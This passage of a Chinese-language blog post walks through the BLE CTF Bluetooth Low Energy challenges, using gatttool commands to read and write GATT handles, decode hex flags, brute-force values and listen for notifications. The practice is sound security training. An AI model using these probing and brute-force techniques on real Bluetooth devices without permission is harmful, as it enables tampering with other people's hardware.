class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0017, char properties: 0x02, char value handle: 0x0018, uuid: 00002a01<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0019, char properties: 0x02, char value handle: 0x001a, uuid: 00002aa6<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0029, char properties: 0x02, char value handle: 0x002a, uuid: 0000ff01<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x002b, char properties: 0x0a, char value handle: 0x002c, uuid: 0000ff02<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x002d, char properties: 0x02, char value handle: 0x002e, uuid: 0000ff03<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x002f, char properties: 0x02, char value handle: 0x0030, uuid: 0000ff04<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0031, char properties: 0x0a, char value handle: 0x0032, uuid: 0000ff05<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0033, char properties: 0x0a, char value handle: 0x0034, uuid: 0000ff06<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0035, char properties: 0x0a, char value handle: 0x0036, uuid: 0000ff07<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0037, char properties: 0x02, char value handle: 0x0038, uuid: 0000ff08<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0039, char properties: 0x08, char value handle: 0x003a, uuid: 0000ff09<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x003b, char properties: 0x0a, char value handle: 0x003c, uuid: 0000ff0a<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x003d, char properties: 0x02, char value handle: 0x003e, uuid: 0000ff0b<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x003f, char properties: 0x1a, char value handle: 0x0040, uuid: 0000ff0c<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0041, char properties: 0x02, char value handle: 0x0042, uuid: 0000ff0d<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0043, char properties: 0x2a, char value handle: 0x0044, uuid: 0000ff0e<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0045, char properties: 0x1a, char value handle: 0x0046, uuid: 0000ff0f<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0047, char properties: 0x02, char value handle: 0x0048, uuid: 0000ff10<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0049, char properties: 0x2a, char value handle: 0x004a, uuid: 0000ff11<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x004b, char properties: 0x02, char value handle: 0x004c, uuid: 0000ff12<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x004d, char properties: 0x02, char value handle: 0x004e, uuid: 0000ff13<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x004f, char properties: 0x0a, char value handle: 0x0050, uuid: 0000ff14<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0051, char properties: 0x0a, char value handle: 0x0052, uuid: 0000ff15<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0053, char properties: 0x9b, char value handle: 0x0054, uuid: 0000ff16<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>handle: 0x0055, char properties: 0x02, char value handle: 0x0056, uuid: 0000ff17<span class="hljs-string">-0000</span><span class="hljs-string">-1000</span><span class="hljs-string">-8000</span><span class="hljs-string">-00805</span>f9b34fb<br>[C8:F0:9E:A6:C8:D2][LE]&gt; <br><br></code></pre></td></tr></table></figure><h2 id="BLE-CTF"><a href="#BLE-CTF" class="headerlink" title="BLE CTF"></a>BLE CTF</h2><p>工具：</p><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>获取20关</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20220920225839769.png" alt="image-20220920225839769"></p><h3 id="第二题-0x002c"><a href="#第二题-0x002c" class="headerlink" title="第二题 0x002c"></a>第二题 0x002c</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720235008470.png"></p><p>根据题目的提示，可以知道先要读取 0x002e 句柄的值。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720234947028.png"></p><p>d205303e099ceff44835<br>把读取到的值 写入 0x002c 中，才能通过这道题。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230721001123680.png"><br>查看答题进度<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230721001234265.png"></p><h3 id="第三题-flag3"><a href="#第三题-flag3" class="headerlink" title="第三题 flag3"></a>第三题 flag3</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223357918.png"></p><p>读取0x0030 的值Ascii 值。 让我们提交设备名的MD5的值到0x002c<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223416919.png"><br>计算 “BLECTF” 的MD5的值  “5cd56d74049ae40f442ece036c6f4f06”<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723223705562.png"></p><p>提交到0x002c  ， 取MD5 值得20个字符。（不知道为什么是20个字符）<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723224154227.png"></p><h3 id="第四题-flag4"><a href="#第四题-flag4" class="headerlink" title="第四题 flag4"></a>第四题 flag4</h3><p>蓝牙GATT 服务提供一些额外得设备属性。尝试查找通用访问— 设备名称得值。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723224300812.png"><br>chatGTP 的解释<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231026835.png"></p><p>在这个文档里查看Device name 的uuid 的值是 0x2A00，对应的是0x0016<br><a href="https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf">https://btprodspecificationrefs.blob.core.windows.net/assigned-numbers/Assigned%20Number%20Types/Assigned_Numbers.pdf</a><br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723230701858.png"><br>读取devicename 对应的value的值并转换成 ASCII<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231249562.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723231651552.png"></p><h3 id="第五题-flag5"><a href="#第五题-flag5" class="headerlink" title="第五题 flag5"></a>第五题 flag5</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723232419155.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230723232431882.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/t/umap</span>2Plus-master [<span class="hljs-number">1</span>|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>]&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0032</span>|awk -F<span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;&#x27;</span>| xxd -r -p<br>Write anything here⏎                                                                                      tigerortiger@ubuntu ~<span class="hljs-regexp">/t/umap</span>2Plus-master&gt; echo -n <span class="hljs-string">&quot;hello&quot;</span>|xxd -ps<br><span class="hljs-number">68656</span>c6c6f<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/t/umap</span>2Plus-master&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0032</span> -n <span class="hljs-number">68656</span>c6c6f<br>Characteristic value was written successfully<br><br><br><br></code></pre></td></tr></table></figure><h3 id="第六题-flag6"><a href="#第六题-flag6" class="headerlink" title="第六题 flag6"></a>第六题 flag6</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724215548836.png"><br>直接读取 0x0034 的value<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724215724161.png"><br>让我们在这个句柄中写入 “yo” </p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724220620242.png"></p><p>做这一题的时候设备崩溃了。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724222418757.png"></p><p>这个题目是考察写入ascii 的值到句柄中。先把ascii 值换成16进制，然后读取句柄的值，在转成16进制提交到0x002c 中。</p><h3 id="第七题-flag7"><a href="#第七题-flag7" class="headerlink" title="第七题 flag7"></a>第七题 flag7</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724224359159.png"></p><p>直接按照提示读取 0x0036， 将0x07 写入到0x0036<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724224526153.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0036</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Write the <span class="hljs-keyword">hex</span> value <span class="hljs-number">0x07</span> here<br>tigerortiger@ubuntu ~ [<span class="hljs-number">1</span>]&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0036</span> -n <span class="hljs-number">07</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0036</span><br>Characteristic value/descriptor: <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">30</span> <span class="hljs-number">62</span> <span class="hljs-number">32</span> <span class="hljs-number">39</span> <span class="hljs-number">66</span> <span class="hljs-number">38</span> <span class="hljs-number">64</span> <span class="hljs-number">61</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">61</span> <span class="hljs-number">64</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span><br>tigerortiger@ubuntu ~&gt; echo -n <span class="hljs-string">&quot;Characteristic value/descriptor: 31 31 37 39 30 38 30 62 32 39 66 38 64 61 31 36 61 64 36 36 &quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br><span class="hljs-number">1179080</span>b29f8da16ad66<br>tigerortiger@ubuntu ~&gt; echo -n <span class="hljs-string">&quot;1179080b29f8da16ad66&quot;</span>|xxd -ps<br><span class="hljs-number">3131373930383062323966386461313661643636</span><br>tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">3131373930383062323966386461313661643636</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="第八题-flag8"><a href="#第八题-flag8" class="headerlink" title="第八题 flag8"></a>第八题 flag8</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724230259822.png"></p><p>读取0x0038 的值，发现往58 句柄写入0xC9。 58 是整数，转换成16进制是0x0036</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0038</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Write <span class="hljs-number">0xC9</span> to handle <span class="hljs-number">58</span><br>tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0036</span> -n C9<br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0036</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Write the <span class="hljs-keyword">hex</span> value <span class="hljs-number">0x07</span> here<br>后面就跟第八题一样<br></code></pre></td></tr></table></figure><h3 id="第九题-flag9"><a href="#第九题-flag9" class="headerlink" title="第九题 flag9"></a>第九题 flag9</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230724231357813.png"><br>按照提示读取0x003c 的题目，让我们爆破00到ff</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x003c</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Brute force <span class="hljs-keyword">my</span> value <span class="hljs-number">00</span> to ff<br></code></pre></td></tr></table></figure><p>写一个爆破的脚本，虽然不理解这是什么意思。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220201508.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x003c</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br><span class="hljs-number">933</span>c1fcfa8ed52d2ec05<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo -n <span class="hljs-string">&quot;933c1fcfa8ed52d2ec05&quot;</span>| xxd -ps<br><span class="hljs-number">3933336331666366613865643532643265633035</span><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">3933336331666366613865643532643265633035</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><h3 id="第十题-flag10"><a href="#第十题-flag10" class="headerlink" title="第十题 flag10"></a>第十题 flag10</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220415001.png"><br>按照题目的意思是，读取0x003e 一千次。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725220645566.png"><br>写脚本<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222437415.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>echo <span class="hljs-string">&quot;Characteristic value/descriptor: 36 66 66 63 64 32 31 34 66 66 65 62 64 63 30 64 30 36 39 65 &quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br><span class="hljs-number">6</span>ffcd214ffebdc0d069e<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo <span class="hljs-string">&quot;6ffcd214ffebdc0d069e&quot;</span>|xxd -ps<br><span class="hljs-number">36666663643231346666656264633064303639650</span>a<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">3666666364323134666665626463306430363965</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><h3 id="第十一题-flag11-没懂notification-是什么意思"><a href="#第十一题-flag11-没懂notification-是什么意思" class="headerlink" title="第十一题 flag11 没懂notification 是什么意思"></a>第十一题 flag11 没懂notification 是什么意思</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222716234.png"><br>没看懂，监听notification<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725222759027.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl">gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0040</span> -n 0a --<span class="hljs-keyword">listen</span><br>Characteristic value was written successfully<br>Notification handle = <span class="hljs-number">0x0040</span> value: <span class="hljs-number">35</span> <span class="hljs-number">65</span> <span class="hljs-number">63</span> <span class="hljs-number">33</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">32</span> <span class="hljs-number">62</span> <span class="hljs-number">63</span> <span class="hljs-number">64</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">63</span> <span class="hljs-number">66</span> <span class="hljs-number">30</span> <span class="hljs-number">36</span> <span class="hljs-number">64</span> <span class="hljs-number">38</span> <span class="hljs-number">65</span> <span class="hljs-number">62</span> <br>^C⏎ <br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>echo <span class="hljs-string">&quot;35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62&quot;</span>|xxd -ps -r<br><span class="hljs-number">5</span>ec3772bcd00cf06d8eb<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo <span class="hljs-string">&quot;5ec3772bcd00cf06d8eb&quot;</span>|xxd -ps<br><span class="hljs-number">35656333373732626364303063663036643865620</span>a<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">3565633337373262636430306366303664386562</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="第十二题-flag12-和上面一题一样看不懂"><a href="#第十二题-flag12-和上面一题一样看不懂" class="headerlink" title="第十二题 flag12 和上面一题一样看不懂"></a>第十二题 flag12 和上面一题一样看不懂</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725225234861.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725230829248.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0042</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Listen to handle <span class="hljs-number">0x0044</span> <span class="hljs-keyword">for</span> a single indication<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0044</span> -n 0a --<span class="hljs-keyword">listen</span><br>Characteristic value was written successfully<br>Indication   handle = <span class="hljs-number">0x0044</span> value: <span class="hljs-number">63</span> <span class="hljs-number">37</span> <span class="hljs-number">62</span> <span class="hljs-number">38</span> <span class="hljs-number">36</span> <span class="hljs-number">64</span> <span class="hljs-number">64</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">34</span> <span class="hljs-number">38</span> <span class="hljs-number">63</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">63</span> <span 